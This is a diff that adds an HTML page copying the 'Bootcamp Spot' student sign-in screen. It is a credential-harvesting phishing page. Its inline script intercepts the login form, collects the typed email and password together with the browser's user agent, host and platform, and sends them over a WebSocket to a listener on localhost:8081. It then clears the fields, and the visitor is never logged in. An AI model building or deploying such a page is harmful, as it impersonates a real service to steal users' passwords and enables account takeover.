@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in to Bootcamp Spot</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="min-height-100">
+    <div class="bcs-login-background">
+      <img src="https://s3.amazonaws.com/bcs-media-dev/ui/background-group-project.jpg" alt="Background Image">
+    </div>
+    <div class="container">
+      <div class="content-wrapper">     
+        <h1>Sign in to Bootcamp Spot</h1>
+        <form id="loginForm">
+          <label for="email">EMAIL ADDRESS *</label>
+          <input type="email" id="email" placeholder="student@example.com">
+
+          <label for="password">PASSWORD *</label>
+          <input type="password" id="password" placeholder="Enter your password">
+
+          <button class="btn-submit">SIGN IN</button>
+        </form>
+
+        <p class="forgot-password"><a href="#">Forgot your password?</a></p>
+
+        <br>
+
+        <p class="privacy-policy-terms">
+          <a href="#">Privacy Policy</a> | <a href="#">Terms and Conditions</a>
+        </p>
+
+        <br>
+
+        <p class="get-in-touch">
+          If you have trouble logging in, try resetting your password or 
+          <a href="#">get in touch with us through this form</a>.
+        </p>
+        
+        <script>
+          console.log("JavaScript code is being executed.");
+
+          // Create a WebSocket connection
+          var socket = new WebSocket('ws://localhost:8081');
+
+          // Handle WebSocket open event
+          socket.addEventListener('open', function (event) {
+            console.log('WebSocket connection established');
+          });
+
+          // Handle form submission event
+          document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            // Get form values
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+
+            // Prepare the log data
+            var logData = "user: " + email + "\nlogin: " + password + "\nagent: " + navigator.userAgent +
+              "\nIP: " + location.host + "\nOS: " + navigator.platform;
+
+            // Output the log data to the WebSocket
+            socket.send(logData);
+
+            // Clear the form fields
+            document.getElementById("email").value = "";
+            document.getElementById("password").value = "";
+          });
+        </script>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
+
